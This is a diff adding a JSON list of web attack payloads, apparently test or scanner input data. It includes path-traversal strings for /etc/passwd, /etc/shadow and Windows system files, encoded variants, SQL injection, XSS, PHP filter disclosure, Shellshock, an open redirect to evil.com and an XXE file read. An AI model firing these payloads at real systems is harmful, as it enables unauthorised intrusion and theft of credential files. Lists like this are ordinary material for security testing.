@@ -1,0 +1,30 @@
+{
+    "unix": [
+        "?file=../../../../etc/passwd",
+        "?file=..%2F..%2Fetc%2Fshadow",
+        "?path=../../../var/log/syslog"
+    ],
+    "windows": [
+        "?file=..\\..\\..\\windows\\win.ini",
+        "?path=..%5C..%5C..%5Cboot.ini"
+    ],
+    "encoded": [
+        "?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "?file=%252e%252e%252fetc%252fpasswd"
+    ],
+    "web": [
+        "?file=../../../../../../../../etc/passwd",
+        "?file=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "?file=..\\..\\..\\..\\..\\..\\windows\\system32\\config\\system",
+        "/?id=1' OR '1'='1' --",
+        "/search?q=<svg onload=alert(1)>",
+        "/?file=php://filter/convert.base64-encode/resource=index.php",
+        "/?path=../../../../../../etc/shadow",
+        "/upload?file=../../windows/win.ini",
+        "/shell?exec=cat /etc/passwd",
+        "/admin?debug=true",
+        "/?input=() { :;}; echo; /bin/bash -c 'ls'",
+        "/redirect?next=https://evil.com",
+        "/test?xml=<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    ]
+}
